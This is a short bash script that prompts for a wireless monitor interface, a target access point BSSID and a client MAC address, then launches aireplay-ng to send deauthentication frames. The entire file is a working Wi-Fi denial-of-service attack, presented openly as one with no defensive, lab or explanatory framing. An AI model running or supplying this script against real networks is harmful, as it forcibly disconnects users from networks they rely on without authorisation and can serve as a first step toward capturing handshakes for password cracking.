#!/bin/bash

echo "[*] Starting deauth attack..."

read -p "[?] Enter monitor interface (e.g. wlan0mon): " mon_iface
read -p "[?] Enter target AP BSSID: " bssid
read -p "[?] Enter client MAC (or broadcast ff:ff:ff:ff:ff:ff): " client_mac

# Deauth attack
xterm -hold -e "aireplay-ng --deauth 10 -a $bssid -c $client_mac $mon_iface"

